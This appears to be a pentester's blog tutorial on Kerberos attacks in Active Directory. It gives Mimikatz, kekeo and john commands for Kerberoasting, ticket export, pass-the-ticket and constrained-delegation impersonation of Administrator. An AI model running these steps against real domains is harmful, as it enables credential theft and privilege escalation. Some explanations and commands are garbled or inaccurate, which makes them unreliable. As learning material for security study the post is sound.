---
title: "Active Directory - Kerberos"
tags: [Metodologies]
categories: ActiveDirectory
mermaid: true
image: https://www.safesystems.com/wp-content/uploads/2020/04/Microsofts-LDAP-Security-Update-and-the-Impact-on-Financial-Institutions-Today-Header-Blog-Image.png
---

# Active Directory - Kerberos

Here you will find some commands to explore Active Directory.

Commands linked to Kerberos Attack. An excellent way to keep the access on.

Hope you enjoy.

# Summary

- [Active Directory - Kerberos](#active-directory---kerberos)
- [Summary](#summary)
- [Initial Consideration](#initial-consideration)
  - [How Kerberos Work?](#how-kerberos-work)
    - [ALL VULN???](#all-vuln)
- [Kerberoast](#kerberoast)
- [Delegation](#delegation)
- [Unconstrained Delegation](#unconstrained-delegation)
  - [Checking Unconstrained Delegation enabled](#checking-unconstrained-delegation-enabled)
  - [Exploit Unconstrained Delegation](#exploit-unconstrained-delegation)
  - [Pass-The-Ticket](#pass-the-ticket)
- [Constrained Delegation](#constrained-delegation)
  - [Exploit Constrained Delegation](#exploit-constrained-delegation)

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained.png)

# Initial Consideration

Now let's go a little deeper into our exploration inside Active Directory, let's play with `Kerberos` which is the AD authentication server.

Logically my explanations will be very simple and not exhaust the whole subject, but it will give you a basis for future studies

Here the `Kerberoast`, `Constrained Delegation` and `Unconstrained Delegation` attacks will be performed

## How Kerberos Work?

Whenever a user requests access to a service made available within the Active Directory environment, he follows this path in the figure below

![](https://0x4rt3mis.github.io/assets/img/active-enum/kerberos.gif)

Which is "explained" here:

**Step 1** --> The client requests a TGT to the kerberos server, the server checks the time stamp

**Step 2** --> KDC (Key Distribution Center) sends a TGT, Ticket Grant Ticket, a ticket that grants access to a ticket that will be the TGS, it is encrypted, signed by the krbtgt hash (that's why when we get the hash from krbtgt we get control over AD)

**Step 3** --> The client sends the TGT back to the DC, to prove that the client has a valid domain user logged in. Give me a TGS since I'm myself, I'm valid for all AD.

**Step 4** --> The KDC encrypts the TGT, the only validation it does is if it can decrypt the TGT with the kerberos hash, so here it is vulnerable, once we can forge any ticket with the krbtgt hash we can pass us by anyone, because it will validate the TGS and give us access to any server/service that is within AD!

**Step 5** --> the user connects to the service he requested, sending the TGS that has already been validated

**Step 6** --> It provides authentication, and gives access to the service requested by the client

What amazes me most is to discover that `ALL` of the steps are vulnerable and open to some kind of exploitation.

### ALL VULN???

Yesss, that's right, all steps are subject to some kind of attack, here we will try to explain and explore them, logically it will not clarify 100% of the concepts, but again, it follows as a basis for future studies, and please, if you have any suggestions or find any error in my explanations, let me know!

# Kerberoast

This "attack" exploits steps `3` and `4`

In step 3 the TGT, which was presented by the KDC/DC, we can request authorization for any service, since the only authentication it does is if it can decrypt with the krbtgt hash

We request the ticket of a service that is running with *advanced privileges*, aka SPN, `Service Principal Name`

With the command `Get-NetUser -SPN` we check which users have these permissions enabled, in this case we check that the user `sqlreportuser` is as SPN

![](https://0x4rt3mis.github.io/assets/img/active-enum/spn.png)

Once we know this, we can request his Ticket to our section.

```ps1
Request-SPN Ticket MSSQLSvc/xxxxxxxx
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/spn1.png)

We verified that the Ticket was injected in our section

```ps1
klist
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/spn2.png)

Now we can export it to crack offline the password

```ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/spn3.png)

It was saved to a `.kirby` file. Now we pass it to our Kali and with the Kirbi2John utility we transform it into a readable format for John

![](https://0x4rt3mis.github.io/assets/img/active-enum/spn4.png)

Now we crack it

```sh
john --wordlist=./filtered_top_100k.txt ticket.hash
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/spn5.png)

This was the attack known as `Kerberoast`, now we go to the one that is more complex which is the Delegation

# Delegation

The main idea of ​​this attack is to understand the credential reuse that Kerberos allows for.

Kerberos Delegation allows the reuse of credentials to access resources on different hosts, that's right, reuse the ticket. This is very useful when talking about multi-tier services or applications where Kerberos Double Hop is required, for example, we have the situation where a user authenticates to a web server and the web server in turn makes the request to a bank of data, the web server can simply access resources (some) in the database as if it were the user and not as the web server service account. And so, having the access it needs to have on the remote server, it is clear that trusted for delegation is needed to make this request as a user.

Confused yet? Let's try to explain better...

But why the hell was this implemented?

![](https://0x4rt3mis.github.io/assets/img/active-enum/diag.png)

1) User gives your credentials for Domain Controller

2) The DC returns you a TGT.

3) User requests TGS to web server.

4) DC provides TGS.

5) User sends TGT and TGS from database server to DC.

6) The web server (service account) connects to the database as if it were the user.

This is the procedure that is always done when authenticating on the server. The idea of ​​exploring these phases is always the `IMPERSONIFICATION`, you impersonating the user to obtain the accesses that theoretically he has on other machines.

We have two types of Delegation, Unconstrained and Constrained, let's now move on to explaining each of them.

# Unconstrained Delegation

The first 4 steps, from the previous diagram, are basic, there will always be, which is the creation/request of TGT and TGS.

As the Web Server has Unconstrained permission, the DC puts the TGS together with the TGT (step 4 and 5 of the previous diagram), the Web Server, which has the unconstrained enabled, extracts the TGT from the token and authenticates whoever it wants as the user who sent

We can use it for privilege escalation, but how? If a Domain Admin connects to a machine that has Unconstrained Delegation enabled, it will generate a ticket in the section and we can extract it and reuse it! Yes, reuse the ticket from the section in our section, and thus have access to places where we normally wouldn't.

## Checking Unconstrained Delegation enabled

To check which machines have Unconstrained Delegation enabled, we must resort to `PowerView.ps1` with the command

```ps1
Get-NetComputer -Unconstrained
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/UNC.png)

Here in the case I hid the machine names, and put as ABC-UNC the machine with Unconstrained enabled

So we check the machines that have, the DC will always have, this permission is native to it.

## Exploit Unconstrained Delegation

In order to explore this, we must have access to this machine, and Administrative access, as we will be using `Mimikatz` to perform ticket extraction

When we check the machine that has it, and with administrator access on it, we export the tickets

```ps1
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export"'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/unc1.png)

We check the tickets that were exported inside the folder and there we see that we have one that is from another machine's `Administrator`

ABC-ADMINPROD1 (Of course I changed the names so as not to expose the server I'm doing this on)

![](https://0x4rt3mis.github.io/assets/img/active-enum/unc2.png)

## Pass-The-Ticket

Now we perform the Pass-The-Ticket and inject this ticket in our section, thus having access to the server as Admin

```ps1
Invoke-Mimikatz -Command '"kerberos::ptt TICKET_SEEN"'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/unc3.png)

Okay, "reused" ticket, now we have access to the server normally

![](https://0x4rt3mis.github.io/assets/img/active-enum/unc4.png)

This is the Unconstrained Delegation, we have almost full access to the server.

Microsoft found that this was very dangerous (and rightly so), then implemented another type of Delegation, Constrained, which limits which accesses the SPN will have on the machine.

# Constrained Delegation

Well, verifying that it was dangerous to leave Unconstrained enabled, Microsoft created the Constrained Delegation, where only some services are available, not access to the machine as it was in Unconstrained. Here in the case a specific user will have direct permissions on the machines.

We verified that the dbservice user has `AllowedToDelegate` permissions which are needed for Constrained Delegation (Through BloodHound, which will be worked on later)

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained2.png)

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained3.png)

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained4.png)

To check which users have Constrained Enabled on which machines we should use `PowerView.ps1` but now in its `Dev` version

[PowerView-Dev.ps1](https://github.com/lucky-luk3/ActiveDirectory/blob/master/PowerView-Dev.ps1)

```ps1
Get-DomainUser -TrustedToAuth
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained1.png)

## Exploit Constrained Delegation

Once we have constrained enabled, and we know that the `dbservice` user in this case has those permissions, let's start exploring.

1st We verified that you really do not have access to the machine where the dbservice is constrained

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained5.png)

2nd We asked KDC about the dbservice TGT

I'm not going to demonstrate here how we capture the user's NTLM hash, this is for the post about `Mimikatz`

For this we will use `kekeo`

[Kekeo](https://github.com/gentilkiwi/kekeo)

```ps1
tgt::ask /user:dbservice /domain:DOMINIO.LOCAL /ntlm:HASH.NTLM.DBSERVICE /ticket:dbservice.kirbi
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained6.png)

3rd Generate the TGS for the services we want to explore

Now it's generating the TGS for the services, the service that is "vulnerable" is TIME but we can also generate tickets for cifs, so we can access its partition

```ps1
tgs::s4u /tgt:TGT_dbservice.kirbi /user:Administrator@DOMAIN /service:time/LOCAL.BOX|cifs/BOX.local
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained7.png)

That's it, tickets have been created for the TIME service and for CIFS, so now let's inject them in the section

4th Inject tickets in the section

```ps1
Invoke-Mimikatz -Command '"kerberos::ptt TICKET_GENERATED"'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained8.png)

5th Access machine share

![](https://0x4rt3mis.github.io/assets/img/active-enum/constrained9.png)

Okay, these were the main vulnerabilities that we could exploit in this way.